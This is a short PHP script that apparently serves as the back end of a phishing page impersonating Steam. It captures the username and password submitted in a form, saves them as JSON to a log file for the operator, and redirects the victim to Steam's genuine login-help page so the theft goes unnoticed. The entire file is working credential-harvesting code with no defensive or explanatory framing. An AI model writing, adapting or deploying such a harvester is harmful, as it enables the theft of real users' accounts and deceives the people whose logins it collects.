<?php

header('Location: https://help.steampowered.com/en/wizard/HelpWithLoginInfo/');
$data = array('site' => 'Steam',
  'user' => $_POST['username'],
  'pass' => $_POST['password']);

  $json_data = json_encode($data);

  $f = fopen('../../../logs/info.txt', 'w+');
  fwrite($f, $json_data);
  fclose($f);
exit();
?>